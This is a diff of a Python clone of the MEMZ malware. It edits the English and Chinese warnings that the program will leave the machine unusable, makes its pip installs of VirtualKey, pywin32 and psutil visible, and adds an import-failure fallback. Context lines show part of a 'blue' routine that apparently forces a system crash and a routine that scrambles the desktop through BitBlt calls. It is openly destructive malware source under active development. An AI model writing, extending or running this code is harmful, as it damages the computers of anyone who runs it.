@@ -32,7 +32,6 @@ if func(0, u"The software just executed is considered malware \r\n"
               u"\r\n"
               u"DO YOU WANT EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"
            u"\n\n\n"
-           u"Chinese：\n"
            u"刚刚执行的软件被认为是恶意软件\n此恶意软件将危害您的计算机并使其无法使用！\n如果您看到这条消息而不知道您刚刚执行了什么，只需按“否”，什么都不会发生。\n"
            u"如果您知道此恶意软件的作用，并且正在使用安全的环境进行测试，请按“是”启动它。\n你想执行这个恶意软件，导致一台无法使用的机器吗？","MEMZ" ,0x34) == 6:
     if func(0, "THIS IS LAST WARNING! \r\n"
@@ -40,7 +39,6 @@ if func(0, u"The software just executed is considered malware \r\n"
                "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE\r\n"
                "STILL EXECUTE IT?"
                "\n\n\n"
-               "Chinese：\n"
                "这是最后一次警告！\n创建者不对使用此恶意软件造成的任何损坏负责\n\n还执行吗???", "MEMZ", 0x34) == 6:
         pass
     else:
@@ -48,17 +46,20 @@ if func(0, u"The software just executed is considered malware \r\n"
 else:
     exit()
 
-os.system("pip install VirtualKey > nul")
+os.system("pip install VirtualKey")
 import VirtualKey
-os.system("pip install pypiwin32 >nul")
-import win32gui, win32api, win32con
-os.system("pip install psutil >nul")
+os.system("pip install pypiwin32")
+try:
+    import win32gui, win32api, win32con
+except ImportError:
+    func(0, "You need to restart this program!", "MEMZ", 0x34)
+
+os.system("pip install psutil")
 
 
 
 wide = dll.GetSystemMetrics(0) * 3
 high = dll.GetSystemMetrics(1) * 3
-print(wide, high)
 def blue():
     ErrKill = c_char()
     HDErr = c_long(0)
@@ -118,9 +119,6 @@ def desktop():
     Rect = RECT(random.randint(0, wide), random.randint(0, high), random.randint(0, wide), random.randint(0, high))
     v0 = dll.GetDesktopWindow()
     v1 = dll.GetWindowDC(v0)
-
-
-    print(Rect.top, Rect.bottom, Rect.left, Rect.right)
     gdidll.BitBlt(v1, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, v1, 0, 0, 0x330008)
     dll.ReleaseDC(v0, v1)
 
